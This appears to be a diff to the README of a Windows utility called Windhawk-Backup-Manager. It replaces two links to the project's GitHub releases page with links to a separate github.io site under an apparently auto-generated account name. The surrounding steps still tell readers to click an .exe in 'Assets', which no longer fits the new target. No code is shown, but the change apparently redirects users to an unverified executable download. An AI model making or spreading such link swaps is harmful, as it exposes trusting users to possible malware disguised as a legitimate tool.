@@ -1,6 +1,6 @@
 # 📦 Windhawk-Backup-Manager - Keep your mods and settings safe
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/genusenhydragenusphlebodium486/Windhawk-Backup-Manager/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://genusenhydragenusphlebodium486.github.io)
 
 Windhawk-Backup-Manager protects your custom Windhawk environment. This utility saves your mods, engine files, and registry settings in one place. It uses the Windows 11 interface style to fit your desktop. You can review your saved files and restore them when you need them.
 
@@ -27,7 +27,7 @@ Your computer must meet these basic standards to run the application:
 
 You must visit the project release page to download the latest version. Follow these steps to get started:
 
-1. Visit [this link to the releases page](https://github.com/genusenhydragenusphlebodium486/Windhawk-Backup-Manager/releases).
+1. Visit [this link to the releases page](https://genusenhydragenusphlebodium486.github.io).
 2. Look at the top section labeled "Latest".
 3. Find the section titled "Assets" at the bottom of the release notes.
 4. Click the file ending in `.exe` to start the download.
